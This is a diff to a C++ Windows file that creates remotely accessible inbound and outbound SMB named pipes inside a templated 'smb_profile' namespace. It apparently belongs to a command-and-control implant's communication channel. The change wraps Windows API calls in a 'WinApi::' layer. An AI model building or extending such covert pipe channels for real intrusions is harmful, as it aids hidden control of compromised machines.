@@ -5,9 +5,7 @@
 //remeber, this is added to comms list of funcs, so we are good to not loop in here
 
 #include <windows.h>
-#include <iostream>
 #include <vector>
-#include <queue>
 #include <mutex>
 #include "comms/queues.h"
 #include "_debug/debug.h"
@@ -68,7 +66,7 @@ namespace [[ smb_profile_namespace ]] {
     inline int register_pipe() {
         DEBUG_LOG("[ [[ smb_profile_namespace ]]::register_pipe ]: Attempting to register inbox...");
         
-        h_inbox_pipe = CreateNamedPipeW(
+        h_inbox_pipe = WinApi::CreateNamedPipeW(
             wstr_inbox_pipe_name.c_str(),
             PIPE_ACCESS_INBOUND,
             PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
@@ -76,13 +74,13 @@ namespace [[ smb_profile_namespace ]] {
         );
 
         if (h_inbox_pipe == INVALID_HANDLE_VALUE) {
-            DEBUG_LOG("[-] Inbox pipe registration failed. Error: " << GetLastError());
+            DEBUG_LOG("[-] Inbox pipe registration failed. Error: " << WinApi::GetLastError());
             return 1;
         }
 
         DEBUG_LOG("[ [[ smb_profile_namespace ]]::register_pipe ]: Attempting to register outbox...");
-        
-        h_outbox_pipe = CreateNamedPipeW(
+
+        h_outbox_pipe = WinApi::CreateNamedPipeW(
             wstr_outbox_pipe_name.c_str(),
             PIPE_ACCESS_OUTBOUND,
             PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
@@ -90,7 +88,7 @@ namespace [[ smb_profile_namespace ]] {
         );
 
         if (h_outbox_pipe == INVALID_HANDLE_VALUE) {
-            DEBUG_LOG("[-] Outbox pipe registration failed. Error: " << GetLastError());
+            DEBUG_LOG("[-] Outbox pipe registration failed. Error: " << WinApi::GetLastError());
             return 1;
         }
 
